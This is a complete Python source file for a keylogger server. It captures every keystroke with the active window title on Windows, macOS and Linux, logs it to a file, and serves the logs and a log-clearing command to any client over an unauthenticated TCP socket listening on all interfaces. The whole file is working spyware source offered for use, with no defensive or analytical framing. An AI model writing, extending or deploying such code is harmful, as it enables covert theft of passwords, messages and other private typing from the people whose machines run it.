#!/usr/bin/env python3
"""
Universal Keylogger Server
- Runs on any machine and allows clients to connect from anywhere
- Captures keystrokes and serves them to authenticated clients
- Listens on all network interfaces by default
"""

import socket
import threading
import json
import time
import logging
import os
from datetime import datetime
import argparse

# For keylogging functionality
from pynput import keyboard

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    filename='keylogger_server.log'
)
logger = logging.getLogger('KeyloggerServer')

class KeyloggerServer:
    def __init__(self, host='0.0.0.0', port=9999):
        self.host = host
        self.port = port
        self.server_socket = None
        self.clients = {}
        self.running = False
        self.log_file = "keystroke_log.txt"
        self.current_window = "Unknown"
        
        # Create logs directory if it doesn't exist
        os.makedirs('logs', exist_ok=True)
    
    def start(self):
        """Start the keylogger server"""
        # Start keylogger in a separate thread
        keylogger_thread = threading.Thread(target=self.start_keylogger)
        keylogger_thread.daemon = True
        keylogger_thread.start()
        
        # Start server to handle client connections
        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        
        try:
            self.server_socket.bind((self.host, self.port))
            self.server_socket.listen(5)
            self.running = True
            
            # Print server information for easy connection
            local_ip = self.get_local_ip()
            print(f"=== Keylogger Server Started ===")
            print(f"Local IP: {local_ip}")
            print(f"Port: {self.port}")
            print(f"Connect using: {local_ip}:{self.port}")
            print("Press Ctrl+C to stop the server")
            
            logger.info(f"Server started on {self.host}:{self.port} (local IP: {local_ip})")
            
            self.accept_connections()
            
        except Exception as e:
            logger.error(f"Server error: {e}")
            self.stop()
    
    def get_local_ip(self):
        """Get the local IP address for connection information"""
        try:
            # Create a temporary socket to determine local IP
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            # Doesn't actually connect, just sets up routing
            s.connect(('8.8.8.8', 80))
            local_ip = s.getsockname()[0]
            s.close()
            return local_ip
        except:
            return "127.0.0.1"  # Fallback to localhost
    
    def start_keylogger(self):
        """Start capturing keystrokes"""
        logger.info("Keylogger started")
        
        # Get active window title (platform specific)
        try:
            # For Windows
            if os.name == 'nt':
                import win32gui
                def get_active_window():
                    window = win32gui.GetForegroundWindow()
                    return win32gui.GetWindowText(window)
                
                # Update active window periodically
                def update_active_window():
                    while self.running:
                        self.current_window = get_active_window()
                        time.sleep(0.5)
                
                window_thread = threading.Thread(target=update_active_window)
                window_thread.daemon = True
                window_thread.start()
            
            # For macOS
            elif os.name == 'posix' and os.uname().sysname == 'Darwin':
                try:
                    import subprocess
                    def get_active_window():
                        try:
                            script = '''
                            osascript -e 'tell application "System Events" to get name of first application process whose frontmost is true'
                            '''
                            result = subprocess.run(script, shell=True, capture_output=True, text=True)
                            return result.stdout.strip()
                        except:
                            return "macOS Window"
                    
                    # Update active window periodically
                    def update_active_window():
                        while self.running:
                            self.current_window = get_active_window()
                            time.sleep(1)
                    
                    window_thread = threading.Thread(target=update_active_window)
                    window_thread.daemon = True
                    window_thread.start()
                except:
                    self.current_window = "macOS Window"
            
            # For Linux
            elif os.name == 'posix':
                try:
                    import subprocess
                    def get_active_window():
                        try:
                            script = "xdotool getwindowfocus getwindowname"
                            result = subprocess.run(script, shell=True, capture_output=True, text=True)
                            return result.stdout.strip()
                        except:
                            return "Linux Window"
                    
                    # Update active window periodically
                    def update_active_window():
                        while self.running:
                            self.current_window = get_active_window()
                            time.sleep(1)
                    
                    window_thread = threading.Thread(target=update_active_window)
                    window_thread.daemon = True
                    window_thread.start()
                except:
                    self.current_window = "Linux Window"
        except:
            logger.warning("Could not set up window tracking")
        
        # Start the keyboard listener
        def on_press(key):
            try:
                # Try to get the character
                key_char = key.char
            except AttributeError:
                # For special keys
                key_char = str(key)
            
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            with open(self.log_file, "a") as f:
                log_entry = f"[{timestamp}] [{self.current_window}] {key_char}\n"
                f.write(log_entry)
        
        # Create and start keyboard listener
        listener = keyboard.Listener(on_press=on_press)
        listener.start()
    
    def accept_connections(self):
        """Accept incoming client connections"""
        logger.info("Waiting for client connections...")
        
        while self.running:
            try:
                client_socket, client_address = self.server_socket.accept()
                logger.info(f"New connection from: {client_address}")
                print(f"Client connected from: {client_address[0]}:{client_address[1]}")
                
                # Start a new thread to handle this client
                client_thread = threading.Thread(
                    target=self.handle_client,
                    args=(client_socket, client_address)
                )
                client_thread.daemon = True
                client_thread.start()
                
            except Exception as e:
                if self.running:
                    logger.error(f"Error accepting connection: {e}")
    
    def handle_client(self, client_socket, client_address):
        """Handle communication with a connected client"""
        client_id = f"{client_address[0]}:{client_address[1]}"
        
        try:
            # No authentication required, just send welcome message
            logger.info(f"Client {client_id} connected")
            client_socket.send(json.dumps({
                "status": "ok",
                "message": "Connection successful"
            }).encode('utf-8'))
            
            # Handle client commands
            while self.running:
                try:
                    data = client_socket.recv(1024).decode('utf-8')
                    if not data:
                        logger.info(f"Client {client_id} disconnected")
                        print(f"Client disconnected: {client_address[0]}:{client_address[1]}")
                        break
                    
                    command = json.loads(data)
                    
                    if command.get('action') == 'get_logs':
                        # Get log data to send to client
                        logs = self.get_log_data(command.get('lines', 100))
                        response = {
                            "status": "ok",
                            "logs": logs
                        }
                        client_socket.send(json.dumps(response).encode('utf-8'))
                        logger.info(f"Sent {len(logs)} log lines to {client_id}")
                    
                    elif command.get('action') == 'clear_logs':
                        # Clear the log file
                        self.clear_logs()
                        response = {
                            "status": "ok",
                            "message": "Logs cleared successfully"
                        }
                        client_socket.send(json.dumps(response).encode('utf-8'))
                        logger.info(f"Logs cleared by {client_id}")
                    
                    else:
                        response = {
                            "status": "error",
                            "message": "Unknown command"
                        }
                        client_socket.send(json.dumps(response).encode('utf-8'))
                        logger.warning(f"Unknown command from {client_id}: {command}")
                
                except json.JSONDecodeError:
                    logger.error(f"Invalid JSON data received from {client_id}")
                    client_socket.send(json.dumps({
                        "status": "error",
                        "message": "Invalid JSON format"
                    }).encode('utf-8'))
                except Exception as e:
                    logger.error(f"Error processing command from {client_id}: {e}")
                    break
        
        except Exception as e:
            logger.error(f"Error handling client {client_id}: {e}")
        
        finally:
            client_socket.close()
    
    def get_log_data(self, lines=100):
        """Get the last N lines from the log file"""
        try:
            if not os.path.exists(self.log_file):
                return []
            
            with open(self.log_file, 'r') as f:
                all_logs = f.readlines()
            
            # Return last N lines, or all if fewer
            return all_logs[-lines:] if lines < len(all_logs) else all_logs
            
        except Exception as e:
            logger.error(f"Error reading log file: {e}")
            return []
    
    def clear_logs(self):
        """Clear the keylogger log file"""
        try:
            # First, create a backup
            if os.path.exists(self.log_file):
                backup_name = f"logs/keystroke_log_backup_{datetime.now().strftime('%Y%m%d%H%M%S')}.txt"
                os.rename(self.log_file, backup_name)
                logger.info(f"Created log backup: {backup_name}")
            
            # Create a new empty log file
            with open(self.log_file, 'w') as f:
                pass
            
            logger.info("Log file cleared")
            
        except Exception as e:
            logger.error(f"Error clearing log file: {e}")
    
    def stop(self):
        """Stop the keylogger server"""
        print("\nStopping server...")
        self.running = False
        if self.server_socket:
            self.server_socket.close()
        logger.info("Server stopped")


def main():
    parser = argparse.ArgumentParser(description='Universal Keylogger Server')
    parser.add_argument('--host', default='0.0.0.0', help='Host to bind to (0.0.0.0 for all interfaces)')
    parser.add_argument('--port', type=int, default=9999, help='Port to bind to')
    
    args = parser.parse_args()
    
    server = KeyloggerServer(host=args.host, port=args.port)
    
    try:
        server.start()
    except KeyboardInterrupt:
        server.stop()


if __name__ == "__main__":
    main()